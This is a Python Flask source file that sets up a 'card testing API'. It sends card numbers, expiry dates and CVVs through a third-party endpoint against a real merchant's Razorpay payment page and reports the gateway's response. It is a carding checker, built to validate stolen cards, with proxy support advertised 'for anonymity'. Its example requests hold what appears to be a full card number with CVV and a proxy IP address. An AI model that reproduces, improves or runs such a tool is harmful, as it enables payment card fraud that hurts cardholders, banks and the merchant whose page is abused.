#!/usr/bin/env python3
"""
==============================================================
  RAZORPAY CARD TESTING API
  Tests cards against Razorpay payment gateway
==============================================================
"""

from flask import Flask, jsonify, request
import asyncio
import aiohttp
import json
import time
import base64
import re
import random
import string
import hashlib
import urllib.parse
from datetime import datetime
from bs4 import BeautifulSoup
from faker import Faker
import logging

# Configure logging
logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger(__name__)

# Initialize
app = Flask(__name__)
fake = Faker('en_US')

# ============================================================
# CONFIGURATION
# ============================================================

# Razorpay test endpoint (this would be your actual Razorpay testing endpoint)
RAZORPAY_TEST_ENDPOINT = "https://mydom.arpitchk.shop/autorz.php/"

# ============================================================
# UTILITY FUNCTIONS
# ============================================================

def validate_cc(cc):
    """Validate credit card format"""
    try:
        if not cc or '|' not in cc:
            return False, "Invalid format"
        parts = cc.split("|")
        if len(parts) != 4:
            return False, "Invalid format"
        num, mm, yy, cvc = parts
        num = ''.join(filter(str.isdigit, num))
        if not num or len(num) < 13 or len(num) > 19:
            return False, "Invalid card"
        if not mm.isdigit() or not (1 <= int(mm) <= 12):
            return False, "Invalid month"
        if not yy.isdigit():
            return False, "Invalid year"
        if not cvc.isdigit() or len(cvc) not in [3, 4]:
            return False, "Invalid CVV"
        return True, "Valid"
    except:
        return False, "Error"

def parse_proxy(proxy_str):
    """Parse proxy string into components"""
    try:
        # Expected format: user:password@ip:port
        if '@' in proxy_str and ':' in proxy_str:
            user_pass, ip_port = proxy_str.split('@', 1)
            if ':' in user_pass and ':' in ip_port:
                username, password = user_pass.split(':', 1)
                ip, port = ip_port.split(':', 1)
                return {
                    'username': username,
                    'password': password,
                    'ip': ip,
                    'port': port
                }
    except Exception as e:
        logger.warning(f"Proxy parsing error: {str(e)}")
    return None

# ============================================================
# RAZORPAY CHECKER
# ============================================================

class RazorpayChecker:
    """Razorpay card checker"""
    
    def __init__(self, proxy=None):
        self.proxy = proxy
        self.base_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; RMX3771) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
        }
        self.session = None
    
    async def __aenter__(self):
        connector = aiohttp.TCPConnector(ssl=False)
        
        if self.proxy:
            try:
                # Create proxy URL with proper scheme
                proxy_url = f"http://{self.proxy['username']}:{self.proxy['password']}@{self.proxy['ip']}:{self.proxy['port']}"
                logger.info(f"Using proxy: {proxy_url}")
                
                # Use ProxyConnector for better control
                proxy_connector = aiohttp.ProxyConnector(
                    proxy=proxy_url,
                    ssl=False,
                    limit=10,
                    limit_per_host=5
                )
                
                self.session = aiohttp.ClientSession(
                    connector=proxy_connector,
                    timeout=aiohttp.ClientTimeout(total=30),
                    cookie_jar=aiohttp.CookieJar()
                )
            except Exception as e:
                logger.error(f"Proxy connection error: {str(e)}")
                raise
        else:
            self.session = aiohttp.ClientSession(
                connector=connector,
                timeout=aiohttp.ClientTimeout(total=30),
                cookie_jar=aiohttp.CookieJar()
            )
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def test_card(self, cc_data):
        """Test card against Razorpay"""
        try:
            # Parse card data
            num, mm, yy, cvc = cc_data.split("|")
            
            # Build Razorpay test URL with proper encoding
            params = {
                'cc': cc_data,
                'url': 'https://razorpay.me/@ukinternational',
                'amount': '100'
            }
            test_url = f"{RAZORPAY_TEST_ENDPOINT}?{urllib.parse.urlencode(params)}"
            
            headers = self.base_headers.copy()
            
            logger.info(f"Testing card: {cc_data[:4]}**** against {test_url}")
            
            async with self.session.get(test_url, headers=headers, allow_redirects=True) as response:
                logger.info(f"Response status: {response.status}")
                
                if response.status == 200:
                    # Try to get JSON response
                    try:
                        result = await response.json()
                        logger.info(f"JSON response received: {str(result)[:100]}")
                        
                        # Extract the relevant fields
                        message = result.get('message', 'Unknown error')
                        status = result.get('status', 'unknown')
                        
                        return {
                            'success': True,
                            'code': status,
                            'message': message
                        }
                    except Exception as e:
                        logger.warning(f"JSON parsing failed: {str(e)}")
                        # Fallback to text response
                        result_text = await response.text()
                        logger.info(f"Text response: {result_text[:200]}")
                        return {
                            'success': True,
                            'code': 'unknown',
                            'message': result_text[:200]  # Limit response size
                        }
                else:
                    error_msg = f"Request failed with status {response.status}"
                    logger.error(error_msg)
                    return {
                        'success': False,
                        'error': error_msg
                    }
                    
        except Exception as e:
            error_msg = f"Test failed: {str(e)}"
            logger.error(error_msg)
            return {
                'success': False,
                'error': error_msg
            }

# ============================================================
# ASYNC WRAPPER
# ============================================================

async def test_razorpay_card(cc, proxy=None):
    """Test card with Razorpay"""
    # Validate card
    is_valid, msg = validate_cc(cc)
    if not is_valid:
        return {"code": "invalid_card", "message": f"Invalid card: {msg}"}
    
    try:
        async with RazorpayChecker(proxy) as checker:
            result = await checker.test_card(cc)
            
            if result.get('success'):
                return {
                    "code": result['code'],
                    "message": result['message']
                }
            else:
                error_msg = result.get('error', 'Unknown error')
                return {
                    "code": "test_failed", 
                    "message": error_msg
                }
    except Exception as e:
        return {
            "code": "exception", 
            "message": str(e)[:100]
        }

# ============================================================
# FLASK ROUTES
# ============================================================

@app.route('/')
def home():
    """API Documentation"""
    return """
    <html>
    <head><title>Razorpay Card Testing API</title></head>
    <body style="font-family: Arial; padding: 40px; background: #1a1a2e; color: #eee;">
        <div style="max-width: 800px; margin: 0 auto; background: #16213e; padding: 30px; border-radius: 10px;">
            <h1 style="color: #f39c12;">🚀 Razorpay Card Testing API</h1>
            <p style="color: #2ecc71; font-weight: bold;">✨ Test cards against Razorpay payment gateway</p>
            <p style="color: #bbb;">Simple endpoint for card testing with proxy support</p>
            
            <h2 style="color: #3498db;">API Endpoints:</h2>
            
            <div style="background: #0f3460; padding: 15px; margin: 15px 0; border-radius: 5px;">
                <strong style="color: #2ecc71;">Card Test:</strong>
                <code style="display: block; background: #1a1a2e; padding: 10px; margin: 10px 0; border-radius: 3px; color: #f39c12;">
                /gate=rz/cc=CARD?proxy=user:password@ip:port
                </code>
            </div>
            
            <h2 style="color: #3498db;">Features:</h2>
            <ul style="color: #bbb;">
                <li>✅ Card validation</li>
                <li>✅ Proxy support</li>
                <li>✅ Razorpay integration</li>
                <li>✅ Clean JSON response</li>
                <li>✅ Error handling</li>
                <li>✅ Detailed logging</li>
            </ul>
            
            <h2 style="color: #3498db;">Response Format:</h2>
            <code style="display: block; background: #1a1a2e; padding: 15px; border-radius: 5px; color: #2ecc71;">
{<br>
&nbsp;&nbsp;"code": "status_code",<br>
&nbsp;&nbsp;"message": "Detailed message"<br>
}
            </code>
            
            <h2 style="color: #3498db;">Example:</h2>
            <code style="display: block; background: #1a1a2e; padding: 10px; margin: 10px 0; border-radius: 3px; color: #f39c12;">
GET /gate=rz/cc=5410719128567508|04|2027|846?proxy=user:password@209.174.185.196:6226<br>
<br>
Response:<br>
{<br>
&nbsp;&nbsp;"code": "card_not_enrolled",<br>
&nbsp;&nbsp;"message": "3dsecure is not enabled for the card by the cardholder or the bank\/issuer"<br>
}
            </code>
            
            <p style="text-align: center; color: #888; margin-top: 30px;">Razorpay Testing API v1.0</p>
        </div>
    </body>
    </html>
    """

@app.route('/gate=rz/cc=<path:cc>')
def gateway_razorpay(cc):
    """Test card with Razorpay"""
    # Extract proxy from query parameters
    proxy_str = request.args.get('proxy', None)
    proxy = None
    
    if proxy_str:
        proxy = parse_proxy(proxy_str)
        if not proxy:
            return jsonify({
                "code": "invalid_proxy", 
                "message": "Proxy format should be user:password@ip:port"
            }), 400
    
    try:
        result = asyncio.run(test_razorpay_card(cc, proxy))
        return jsonify(result)
    except Exception as e:
        return jsonify({
            "code": "server_error", 
            "message": str(e)[:100]
        }), 500

@app.errorhandler(404)
def not_found(error):
    return jsonify({
        "code": "endpoint_not_found", 
        "message": "Endpoint not found"
    }), 404

# ============================================================
# RUN SERVER
# ============================================================

if __name__ == "__main__":
    print("""
╔════════════════════════════════════════════════════════════╗
║   RAZORPAY CARD TESTING API                           ║
╚════════════════════════════════════════════════════════════╝

🚀 Server: http://localhost:8000/
🔑 API Key: None (public access)

✨ FEATURES:
──────────────────────────────
✅ Card testing against Razorpay
✅ Proxy support for anonymity
✅ Clean JSON responses
✅ Error handling
✅ Detailed logging

ENDPOINTS:
──────────
Card Test:
http://localhost:8000/gate=rz/cc=CARD?proxy=user:password@ip:port

OUTPUT:
───────
{
  "code": "status_code",
  "message": "Detailed message"
}

EXAMPLE:
───────
http://localhost:8000/gate=rz/cc=5410719128567508|04|2027|846?proxy=user:password@209.174.185.196:6226

RESPONSE:
{
  "code": "card_not_enrolled", 
  "message": "3dsecure is not enabled for the card by the cardholder or the bank\/issuer"
}
    """)
    
    app.run(host='0.0.0.0', port=8000, debug=True, threaded=True)
